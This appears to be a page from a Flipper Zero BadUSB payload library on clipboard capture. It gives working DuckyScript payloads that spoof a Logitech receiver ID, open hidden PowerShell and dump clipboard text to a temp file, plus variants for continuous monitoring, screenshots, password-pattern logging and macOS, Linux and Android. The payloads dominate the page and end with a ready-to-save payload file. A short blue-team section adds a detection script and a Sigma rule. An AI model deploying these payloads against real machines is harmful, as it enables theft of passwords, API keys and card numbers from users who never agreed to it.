# FZ-I08: Clipboard Capture

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I08 |
| **Name** | Clipboard Capture |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~4 seconds |
| **Output** | %TEMP%\clipboard.txt |
| **MITRE ATT&CK** | T1115 (Clipboard Data) |

## What This Payload Does

Captures the current contents of the Windows clipboard. Users often copy sensitive data like passwords, credit card numbers, API keys, and confidential text, making clipboard data a high-value target.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Clipboard Capture
REM Target: Windows 10/11
REM Action: Captures clipboard contents
REM Output: %TEMP%\clipboard.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Capture clipboard to file
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN $clip = [System.Windows.Forms.Clipboard]::GetText()
STRINGLN "=== CLIPBOARD CAPTURE ===" | Out-File "$env:TEMP\clipboard.txt"
STRINGLN "Captured: $(Get-Date)" | Out-File "$env:TEMP\clipboard.txt" -Append
STRINGLN "" | Out-File "$env:TEMP\clipboard.txt" -Append
STRINGLN $clip | Out-File "$env:TEMP\clipboard.txt" -Append
STRINGLN exit
```

---

## Understanding Clipboard Access

### Windows Clipboard Types

| Type | Contains |
|------|----------|
| Text | Plain text, URLs, code |
| Rich Text | Formatted text (RTF) |
| HTML | Web content |
| Files | File paths |
| Images | Screenshots, copied images |

### PowerShell Clipboard Methods

```powershell
# Get text (Windows 10+)
Get-Clipboard

# Get text (older method, works everywhere)
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()

# Set clipboard
Set-Clipboard -Value "text"

# Get files from clipboard
Get-Clipboard -Format FileDropList

# Get image from clipboard
Get-Clipboard -Format Image
```

---

## Payload Variations

### Continuous Clipboard Monitor

```ducky
REM Monitor clipboard for 60 seconds
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN $last = ""; $end = (Get-Date).AddSeconds(60)
STRINGLN while ((Get-Date) -lt $end) {
STRINGLN   $current = [System.Windows.Forms.Clipboard]::GetText()
STRINGLN   if ($current -ne $last -and $current) {
STRINGLN     "$(Get-Date): $current" >> "$env:TEMP\cliplog.txt"
STRINGLN     $last = $current
STRINGLN   }
STRINGLN   Start-Sleep -Milliseconds 500
STRINGLN }
```

### Capture with Context

```ducky
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN $clip = [System.Windows.Forms.Clipboard]::GetText()
STRINGLN $context = @{
STRINGLN   Timestamp = Get-Date
STRINGLN   User = $env:USERNAME
STRINGLN   Computer = $env:COMPUTERNAME
STRINGLN   ActiveWindow = (Get-Process | Where-Object {$_.MainWindowHandle -eq (Get-Process -Id $PID).MainWindowHandle}).ProcessName
STRINGLN   ClipboardContent = $clip
STRINGLN }
STRINGLN $context | ConvertTo-Json | Out-File "$env:TEMP\clipboard.json"
```

### Clipboard with Screenshot

```ducky
REM Capture both clipboard and screenshot
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN [System.Windows.Forms.Clipboard]::GetText() | Out-File "$env:TEMP\clip.txt"
STRINGLN Add-Type -AssemblyName System.Drawing
STRINGLN $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
STRINGLN $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
STRINGLN $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
STRINGLN $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
STRINGLN $bitmap.Save("$env:TEMP\screen.png")
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN echo "=== CLIPBOARD CAPTURE ===" > /tmp/clipboard.txt
STRINGLN echo "Captured: $(date)" >> /tmp/clipboard.txt
STRINGLN echo "" >> /tmp/clipboard.txt
STRINGLN pbpaste >> /tmp/clipboard.txt
```

macOS Commands:
- `pbpaste` - Get clipboard content
- `pbcopy` - Set clipboard content

### Linux (X11)

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Requires xclip or xsel installed
STRINGLN echo "=== CLIPBOARD CAPTURE ===" > /tmp/clipboard.txt
STRINGLN echo "Captured: $(date)" >> /tmp/clipboard.txt
STRINGLN xclip -selection clipboard -o >> /tmp/clipboard.txt 2>/dev/null || xsel --clipboard --output >> /tmp/clipboard.txt 2>/dev/null
```

### Linux (Wayland)

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Wayland uses wl-paste
STRINGLN echo "=== CLIPBOARD CAPTURE ===" > /tmp/clipboard.txt
STRINGLN wl-paste >> /tmp/clipboard.txt 2>/dev/null
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM Android clipboard access requires termux-api package
STRINGLN pkg install termux-api -y
STRINGLN echo "=== CLIPBOARD ===" > /sdcard/clipboard.txt
STRINGLN termux-clipboard-get >> /sdcard/clipboard.txt
```

### iOS

iOS clipboard cannot be accessed via BadUSB due to sandbox restrictions. Apps can only access clipboard when in foreground, and no keyboard-based method exists to extract clipboard data.

---

## What Users Copy

Understanding what's commonly in clipboards:

| Content Type | Frequency | Value |
|-------------|-----------|-------|
| Passwords | High | Very High |
| URLs | High | Medium |
| Code Snippets | Medium | Low-Medium |
| API Keys/Tokens | Medium | Very High |
| Credit Cards | Low | Very High |
| Emails/Text | High | Low |
| File Paths | Medium | Low |

---

## Red Team Perspective

### High-Value Clipboard Targets

| Content | Indicators |
|---------|-----------|
| Passwords | Random strings, special chars |
| API Keys | Long alphanumeric, prefixes (sk_, api_, etc.) |
| Tokens | JWT format, base64 strings |
| Credit Cards | 16 digits, often with spaces |
| SSH Keys | BEGIN/END blocks |
| Crypto Addresses | bc1, 0x prefixes |

### Pattern Detection

```powershell
# Look for password-like strings
$clip = Get-Clipboard
if ($clip -match '^[A-Za-z0-9!@#$%^&*]{8,}$') {
    "Possible password: $clip"
}

# Look for API keys
if ($clip -match '^(sk_|api_|key_|token_)[A-Za-z0-9]{20,}') {
    "Possible API key: $clip"
}

# Look for credit cards
if ($clip -match '^\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}$') {
    "Possible credit card"
}
```

### Attack Chain

```
Clipboard Capture → Data Analysis → Credential Use → Account Access
        ↑
    You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **API Calls**
   - Clipboard access from unusual processes
   - System.Windows.Forms assembly loading

2. **Process Behavior**
   - PowerShell accessing clipboard
   - Multiple clipboard reads in short time

3. **File Creation**
   - Files containing clipboard markers
   - Temp files with captured content

### Detection Script

```powershell
# Monitor for clipboard access attempts
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 200 | Where-Object {
    $_.Message -match 'Clipboard|GetText|pbpaste|xclip'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,300)}}
```

### Sigma Rule

```yaml
title: Clipboard Data Collection
status: experimental
description: Detects attempts to access clipboard data via scripts
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'GetText()'
            - 'Get-Clipboard'
            - 'System.Windows.Forms.Clipboard'
            - 'Windows.Forms.Clipboard'
    condition: selection
level: medium
tags:
    - attack.collection
    - attack.t1115
```

### Prevention

1. **Clipboard Managers**
   - Use clipboard managers that clear history
   - Auto-clear sensitive data

2. **Password Managers**
   - Use auto-type instead of clipboard
   - Short clipboard timeout

3. **Endpoint Protection**
   - Monitor clipboard access
   - Alert on unusual patterns

---

## Practice Exercises

### Exercise 1: Check Clipboard Type
Determine what type of data is in clipboard:
```ducky
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN [System.Windows.Forms.Clipboard]::ContainsText()
STRINGLN [System.Windows.Forms.Clipboard]::ContainsImage()
STRINGLN [System.Windows.Forms.Clipboard]::ContainsFileDropList()
```

### Exercise 2: Clear Clipboard
Clear the clipboard after capture:
```ducky
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN $clip = [System.Windows.Forms.Clipboard]::GetText()
STRINGLN [System.Windows.Forms.Clipboard]::Clear()
```

### Exercise 3: Monitor for Passwords
Watch clipboard for password-like content:
```ducky
STRINGLN while($true){$c=Get-Clipboard;if($c-match'^[^\s]{8,20}$'){"$(Get-Date):$c">>$env:TEMP\pw.txt};sleep 1}
```

---

## Payload File

Save as `FZ-I08_Clipboard_Capture.txt`:

```ducky
REM FZ-I08: Clipboard Capture
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN Add-Type -AssemblyName System.Windows.Forms;"=== CLIPBOARD ===$(Get-Date)`n$([System.Windows.Forms.Clipboard]::GetText())"|Out-File "$env:TEMP\clip.txt";exit
```

---

[← FZ-I07 Download and Execute](FZ-I07_Download_Execute.md) | [Back to Intermediate](README.md) | [Next: FZ-I09 Registry Persistence →](FZ-I09_Registry_Persistence.md)
